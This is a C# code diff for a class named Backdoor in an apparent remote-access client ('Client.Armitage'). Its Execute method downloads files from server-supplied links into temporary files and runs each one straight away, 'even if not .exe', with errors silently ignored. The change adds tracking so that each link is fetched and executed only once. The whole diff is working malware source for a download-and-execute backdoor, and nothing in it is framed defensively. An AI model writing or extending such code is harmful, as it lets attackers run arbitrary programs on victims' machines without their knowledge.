@@ -13,8 +13,10 @@ namespace Client.Armitage
     /// </summary>
     public class Backdoor
     {
-        private string[] _links;
-        public Backdoor(string[] execlinks)
+        private List<Tuple<string, float>> _finishedlinks;
+
+        private List<Tuple<string, float>> _links;
+        public Backdoor(List<Tuple<string, float>> execlinks)
         {
             _links = execlinks;
         }
@@ -23,35 +25,41 @@ namespace Client.Armitage
         /// </summary>
         public async void Execute()
         {
-            if (_links.Length > 0)
+            if (_links.Count > 0)
                 await Task.Run(() =>
                 {
                     foreach (var l in _links)
                     {
-                        string filename = Path.GetTempFileName();
-                        if (!File.Exists(filename))
+                        // check if already been downloaded and executed
+                        if (_finishedlinks.FindIndex(i => i.Item1 == l.Item1) <= -1)
                         {
-                            filename = Communication.Server.AsyncDownloadFile(l, filename).Result;
+                            string filename = Path.GetTempFileName();
 
-                            // run the file RIGHT after downloading
-                            if (!string.IsNullOrEmpty(filename) && File.Exists(filename))
+                            if (!File.Exists(filename))
                             {
-                                try
-                                {
-                                    // run even if not .exe
-                                    var p = new Process
-                                    {
-                                        StartInfo = new ProcessStartInfo
-                                        {
-                                            FileName = filename,
-                                            UseShellExecute = false
-                                        }
-                                    };
-                                    p.Start();
-                                }
-                                catch
-                                {
+                                filename = Communication.Server.AsyncDownloadFile(l.Item1, filename).Result;
 
+                                // run the file RIGHT after downloading
+                                if (!string.IsNullOrEmpty(filename) && File.Exists(filename))
+                                {
+                                    try
+                                    {
+                                        _finishedlinks.Add(new Tuple<string, float>(l.Item1, l.Item2));
+                                        // run even if not .exe
+                                        var p = new Process
+                                        {
+                                            StartInfo = new ProcessStartInfo
+                                            {
+                                                FileName = filename,
+                                                UseShellExecute = false
+                                            }
+                                        };
+                                        p.Start();
+                                    }
+                                    catch
+                                    {
+
+                                    }
                                 }
                             }
                         }
